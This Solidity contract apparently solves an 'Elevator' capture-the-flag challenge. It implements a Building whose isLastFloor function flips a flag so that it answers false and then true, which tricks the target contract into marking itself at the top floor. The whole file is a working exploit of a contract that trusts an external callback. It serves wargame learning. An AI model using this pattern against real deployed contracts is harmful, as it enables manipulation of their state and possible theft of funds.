// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Elevator.sol";

contract BuildingSolution is Building {
    Elevator public elev;
    bool public flag;

    constructor (address _elev) public {
        elev = Elevator(_elev);
    }

    function goToTop() public {
        elev.goTo(1);
    }

    function isLastFloor(uint) public override returns(bool){
        if (!flag) {
            flag = true;
            return false;
        } else {
            flag = false;
            return true;
        }
    }
}